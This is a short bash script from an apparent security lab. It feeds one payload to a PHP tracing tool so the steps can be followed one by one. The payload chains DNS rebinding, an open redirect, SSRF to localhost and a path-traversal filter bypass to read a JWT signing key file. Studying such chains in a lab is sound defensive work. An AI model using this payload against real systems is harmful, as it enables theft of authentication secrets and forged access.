#!/usr/bin/env bash
# Payload 单步追踪（自动使用全新子域名，避免 10 秒窗口问题）
# 用法: bash lab/run_trace.sh   （实验环境需已启动）
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SUB="trace$(date +%s)"
PAYLOAD="http://${SUB}.cache.rebind.huanyutech.cn:8080/jump.php?url=http%3A%2F%2F127.0.0.1%3A8081%2Fdebug%2Fpreview.php%3Ffile%3D....%2F%2F....%2F%2F....%2F%2Fopt%2Fsupplylink%2Fconfig%2Fjwt.key"
php "$REPO_ROOT/lab/trace_payload.php" "$PAYLOAD"
